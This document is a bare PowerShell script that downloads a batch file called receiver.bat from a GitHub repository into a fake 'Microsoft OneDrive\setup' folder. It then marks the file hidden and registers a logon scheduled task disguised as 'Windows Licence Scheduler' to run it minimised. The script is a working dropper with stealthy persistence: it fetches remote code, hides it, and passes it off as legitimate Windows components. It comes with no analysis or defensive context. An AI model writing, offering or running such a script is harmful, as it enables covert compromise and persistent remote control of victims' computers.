# Download the batch file
Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.bat' -OutFile 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat'

# Hide the batch file
Set-ItemProperty -Path 'C:\ProgramData\Microsoft OneDrive\setup\receiver.bat' -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Create the scheduled task action
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min """" ""C:\ProgramData\Microsoft OneDrive\setup\receiver.bat"""

# Create the scheduled task trigger
$trigger = New-ScheduledTaskTrigger -AtLogon

# Create the scheduled task principal
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited

# Create the scheduled task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the scheduled task with the name "Windows Licence Scheduler"
Register-ScheduledTask -TaskName "Windows Licence Scheduler" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

pause
